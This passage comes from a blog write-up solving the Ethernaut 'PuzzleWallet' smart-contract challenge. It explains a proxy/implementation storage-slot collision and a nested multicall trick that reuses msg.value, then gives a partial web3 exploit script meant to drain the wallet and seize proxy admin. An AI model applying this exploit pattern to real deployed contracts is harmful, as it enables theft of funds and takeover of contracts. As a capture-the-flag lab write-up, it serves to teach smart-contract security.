</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">32</span><span>        </span><span class="token" style="color:#dcdcaa">require</span><span class="token" style="color:#d4d4d4">(</span><span>msg</span><span class="token" style="color:#d4d4d4">.</span><span class="token property-access">sender</span><span> </span><span class="token" style="color:#d4d4d4">==</span><span> owner</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">&quot;Not the owner&quot;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">33</span><span>        </span><span class="token spread" style="color:#d4d4d4">...</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">34</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">35</span><span>        </span><span class="token" style="color:#6a9955">// You should be in whitelisted to be here</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">36</span><span>        </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">multicall</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#9cdcfe">bytes</span><span class="token" style="color:#d4d4d4">[</span><span class="token" style="color:#d4d4d4">]</span><span class="token" style="color:#9cdcfe"> calldata data</span><span class="token" style="color:#d4d4d4">)</span><span> external payable onlyWhitelisted </span><span class="token" style="color:#d4d4d4">{</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">37</span><span>            </span><span class="token spread" style="color:#d4d4d4">...</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">38</span><span>            assembly </span><span class="token" style="color:#d4d4d4">{</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">39</span><span>                </span><span class="token" style="color:#6a9955">// for more low level ops</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">40</span><span>                </span><span class="token literal-property" style="color:#9cdcfe">selector</span><span> </span><span class="token" style="color:#d4d4d4">:</span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#dcdcaa">mload</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#dcdcaa">add</span><span class="token" style="color:#d4d4d4">(</span><span>_data</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#b5cea8">32</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">41</span><span>            </span><span class="token" style="color:#d4d4d4">}</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">42</span><span>            </span><span class="token spread" style="color:#d4d4d4">...</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">43</span><span>            </span><span class="token" style="color:#6a9955">// deposit can only be called once </span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">44</span><span>            </span><span class="token" style="color:#c586c0">if</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span>selector </span><span class="token" style="color:#d4d4d4">==</span><span> </span><span class="token" style="color:#569CD6">this</span><span class="token" style="color:#d4d4d4">.</span><span class="token property-access">deposit</span><span class="token" style="color:#d4d4d4">.</span><span class="token property-access">selector</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">45</span><span>                </span><span class="token" style="color:#dcdcaa">require</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">!</span><span>depositCalled</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">&quot;Deposit can only be called once&quot;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">46</span><span>                </span><span class="token" style="color:#6a9955">// Protect against reusing msg.value</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">47</span><span>                depositCalled </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#569cd6">true</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">48</span><span>            </span><span class="token" style="color:#d4d4d4">}</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">49</span><span>            </span><span class="token spread" style="color:#d4d4d4">...</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">50</span><span>            </span><span class="token" style="color:#6a9955">// To not mistake it for the normal contract to contract delegate let&#x27;s call it selfDelegate.</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">51</span><span>            </span><span class="token" style="color:#d4d4d4">(</span><span>bool success</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#dcdcaa">address</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#569CD6">this</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">delegatecall</span><span class="token" style="color:#d4d4d4">(</span><span>data</span><span class="token" style="color:#d4d4d4">[</span><span>i</span><span class="token" style="color:#d4d4d4">]</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">52</span><span>            </span><span class="token" style="color:#dcdcaa">require</span><span class="token" style="color:#d4d4d4">(</span><span>success</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">&quot;Error while delegating call&quot;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">53</span><span>        </span><span class="token" style="color:#d4d4d4">}</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">54</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">55</span><span></span><span class="token" style="color:#d4d4d4">}</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">56</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">57</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">58</span>
</span></code></div></pre>
<p class="chakra-text css-0" node="[object Object]">Following the inheritance tree I found finally how the proxy call the real implementation. It was hinted in the challenge description too.</p>
<pre><div class="codeStyle" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-js" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">1</span><span>  </span><span class="token" style="color:#569CD6">let</span><span> </span><span class="token literal-property" style="color:#9cdcfe">result</span><span> </span><span class="token" style="color:#d4d4d4">:</span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#dcdcaa">delegatecall</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#dcdcaa">gas</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">,</span><span> implementation</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#b5cea8">0</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#dcdcaa">calldatasize</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#b5cea8">0</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#b5cea8">0</span><span class="token" style="color:#d4d4d4">)</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">2</span>
</span></code></div></pre>
<p class="chakra-text css-0" node="[object Object]">Okay let&#x27;s sum it up in a diagram.</p>
<p class="chakra-text css-0" node="[object Object]"><div class="chakra-stack css-bwdt07"><div class="chakra-stack css-1pb7l90"><div class="css-1ui0t94"><img src="https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138015/9b067dbdb383316b6e46909a1bc3a9d8df1c699f4c6091286b753b9fd2e54fcc_e13u24.png" alt="PuzzleWallet diagram" style="scale:1.2px;width:100%"/></div><p class="chakra-text css-1qz7fzr">PuzzleWallet diagram</p></div></div></p>
<p class="chakra-text css-0" node="[object Object]">delegateCall can create big messes if we are not careful to the storage layout like we have seen in previous challenges. Let&#x27;s inspect the storage layout for both contracts.</p>
<p class="chakra-text css-0" node="[object Object]"><div class="chakra-stack css-bwdt07"><div class="chakra-stack css-1pb7l90"><div class="css-1ui0t94"><img src="https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138027/f6f56436b637fed9a8b0a7f1353a0da755a55af222edb26ed38c71fb3d76435e_t0ouln.png" alt="PuzzleWallet storage" style="scale:1.2px;width:100%"/></div><p class="chakra-text css-1qz7fzr">PuzzleWallet storage</p></div></div></p>
<p class="chakra-text css-0" node="[object Object]"><code class="inline-code">owner</code> and <code class="inline-code">pendingAdmin</code> both are at the slot[0] which is a very big problem. We can manipulate the pendingAdmin so when we <code class="inline-code">puzzleWalletAddress.delegateCall</code> we became the owner of the puzzleWallet contract ! huuuge.</p>
<p class="chakra-text css-0" node="[object Object]">We will be using the <code class="inline-code">proposeNewAdmin</code> to set the <code class="inline-code">pendingAdmin</code> value.</p>
<p class="chakra-text css-0" node="[object Object]">Okay so now we can execute <code class="inline-code">owner</code> functions. Let&#x27;s not forget our goal is to become the <code class="inline-code">owner</code> of the <em>Proxy</em> contract. Let&#x27;s look for the function that can set <code class="inline-code">slot[1]</code> of the storage in both contracts.</p>
<pre><div class="codeStyle" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-js" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">1</span><span> </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">setMaxBalance</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#9cdcfe">uint256 _maxBalance</span><span class="token" style="color:#d4d4d4">)</span><span> external onlyWhitelisted </span><span class="token" style="color:#d4d4d4">{</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">2</span><span>      </span><span class="token" style="color:#6a9955">// contract&#x27;s balance should be 0, but wait how much is it now ? </span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">3</span><span>      </span><span class="token" style="color:#dcdcaa">require</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#dcdcaa">address</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#569CD6">this</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">.</span><span class="token property-access">balance</span><span> </span><span class="token" style="color:#d4d4d4">==</span><span> </span><span class="token" style="color:#b5cea8">0</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">&quot;Contract balance is not 0&quot;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">4</span><span>      </span><span class="token spread" style="color:#d4d4d4">...</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">5</span><span> </span><span class="token" style="color:#d4d4d4">}</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">6</span>
</span></code></div></pre>
<p class="chakra-text css-0" node="[object Object]">So first of all we need to be <code class="inline-code">whitelisted</code>. We can do that</p>
<pre><div class="codeStyle" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-js" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">1</span><span class="token" style="color:#c586c0">await</span><span> contract</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">addToWhitelist</span><span class="token" style="color:#d4d4d4">(</span><span>player</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">2</span>
</span></code></div></pre>
<p class="chakra-text css-0" node="[object Object]">Second we need to make the contract balance to 0. <code class="inline-code">await web3.eth.getBalance(instance)</code> will return <span class="chakra-text css-gv9qss">0.001</span> ethers as balance. The <code class="inline-code">execute</code> function won&#x27;t allow such a thing as we can only withdraw what we did deposit (It&#x27;s tracked in storage variable <code class="inline-code">balances</code>). The only way to drain funds is to have more <code class="inline-code">balance</code> than the amount we deposited.</p>
<p class="chakra-text css-0" node="[object Object]">If we can&#x27;t call deposit multiple times in one <code class="inline-code">multicall</code> how about we do it but by adding another layer of <code class="inline-code">multicall</code></p>
<p class="chakra-text css-0" node="[object Object]"><div class="chakra-stack css-bwdt07"><div class="chakra-stack css-1pb7l90"><div class="css-1ui0t94"><img src="https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138026/bc95441a9b162a8b1494771895c5a3385ec0e2be3c4d26376c351eae4a5f5d1d_ggsn87.png" alt="PuzzleWallet call hiearchy" style="scale:1.2px;width:100%"/></div><p class="chakra-text css-1qz7fzr">PuzzleWallet call hiearchy</p></div></div></p>
<p class="chakra-text css-0" node="[object Object]">This allows to have the double of the msg.value as balance. Okay so we said we had <span class="chakra-text css-gv9qss">0.001</span> ethers as contract balance ? let&#x27;s deposit 0.001 to our account so we can drain it. ( we will have the same value for our balance and the contract&#x27;s ) . By having the contract&#x27;s balance as 0 we can simply set the owner ow I mean maxBalance to our player account to <span class="chakra-text css-gv9qss">hijack the proxy</span>.</p>
<div class="css-17l36zw"></div>
<p class="chakra-text css-0" node="[object Object]"><span class="chakra-text css-gv9qss">Exploitation</span></p>
<ol>
<li>become the owner of the contract</li>
<li>become whitelisted</li>
<li>deposit the balance of the contract with multiple calls</li>
<li>withdraw all funds</li>
<li>setMaxBalance as our address</li>
</ol>
<blockquote>
<p class="chakra-text css-0" node="[object Object]">The proxy is completely transparent this is possible by loading the ABI of the PuzzleWallet and using the address of the proxy. Don&#x27;t get confused the address is the proxy&#x27;s !</p>
</blockquote>
<pre><div class="codeStyle" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-js" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">1</span><span class="token" style="color:#569CD6">const</span><span> proposeAdminCall</span><span class="token" style="color:#d4d4d4">=</span><span> web3</span><span class="token" style="color:#d4d4d4">.</span><span class="token property-access">eth</span><span class="token" style="color:#d4d4d4">.</span><span class="token property-access">abi</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">encodeFunctionCall</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">{</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">2</span><span></span><span class="token literal-property" style="color:#9cdcfe">name</span><span class="token" style="color:#d4d4d4">:</span><span> </span><span class="token" style="color:#ce9178">&#x27;proposeNewAdmin&#x27;</span><span class="token" style="color:#d4d4d4">,</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">3</span><span>    </span><span class="token literal-property" style="color:#9cdcfe">type</span><span class="token" style="color:#d4d4d4">:</span><span> </span><span class="token" style="color:#ce9178">&#x27;function&#x27;</span><span class="token" style="color:#d4d4d4">,</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">4</span><span>    </span><span class="token literal-property" style="color:#9cdcfe">inputs</span><span class="token" style="color:#d4d4d4">:</span><span> </span><span class="token" style="color:#d4d4d4">[</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">5</span><span>        </span><span class="token" style="color:#d4d4d4">{</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">6</span><span>            </span><span class="token literal-property" style="color:#9cdcfe">type</span><span class="token" style="color:#d4d4d4">:</span><span> </span><span class="token" style="color:#ce9178">&#x27;address&#x27;</span><span class="token" style="color:#d4d4d4">,</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">7</span><span>            </span><span class="token literal-property" style="color:#9cdcfe">name</span><span class="token" style="color:#d4d4d4">:</span><span> </span><span class="token" style="color:#ce9178">&#x27;_newAdmin&#x27;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">8</span><span>        </span><span class="token" style="color:#d4d4d4">}</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">9</span><span>    </span><span class="token" style="color:#d4d4d4">]</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">10</span><span></span><span class="token" style="color:#d4d4d4">}</span><span class="token" style="color:#d4d4d4">,</span><span>player</span><span class="token" style="color:#d4d4d4">)</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">11</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">12</span><span></span><span class="token" style="color:#c586c0">await</span><span> web3</span><span class="token" style="color:#d4d4d4">.</span><span class="token property-access">eth</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">sendTransaction</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">{</span><span class="token literal-property" style="color:#9cdcfe">data</span><span class="token" style="color:#d4d4d4">:</span><span>proposeAdminCall</span><span class="token" style="color:#d4d4d4">,</span><span class="token" style="color:#c586c0">from</span><span class="token" style="color:#d4d4d4">:</span><span>player</span><span class="token" style="color:#d4d4d4">,</span><span class="token literal-property" style="color:#9cdcfe">to</span><span class="token" style="color:#d4d4d4">:</span><span>instance</span><span class="token" style="color:#d4d4d4">}</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">13</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">14</span><span></span><span class="token" style="color:#c586c0">await</span><span> contract</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">addToWhitelist</span><span class="token" style="color:#d4d4d4">(</span><span>player</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">15</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">16</span><span></span><span class="token" style="color:#6a9955">// getting the deposit call data</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">17</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">18</span><span></span><span class="token" style="color:#569CD6">const</span><span> depositData </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#c586c0">await</span><span> contract</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">methods</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&#x27;deposit()&#x27;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">request</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">.</span><span class="token property-access">data</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">19</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">20</span><span></span><span class="token" style="color:#569CD6">const</span><span> multiCallData </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#c586c0">await</span><span> contract</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">methods</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&#x27;multicall(bytes[])&#x27;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">request</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">[</span><span>depositData</span><span class="token" style="color:#d4d4d4">]</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">.</span><span class="token property-access">data</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">21</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">22</span><span></span><span class="token" style="color:#c586c0">await</span><span> contract</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">multicall</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">[</span><span>multicallData</span><span class="token" style="color:#d4d4d4">,</span><span>multicallData</span><span class="token" style="color:#d4d4d4">]</span><span class="token" style="color:#d4d4d4">,</span><span class="token" style="color:#d4d4d4">{</span><span class="token literal-property" style="color:#9cdcfe">value</span><span class="token" style="color:#d4d4d4">:</span><span class="token" style="color:#dcdcaa">toWei</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&#x27;0.001&#x27;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">}</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span> </span><span class="token" style="color:#6a9955">// adding to our balance</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">23</span>
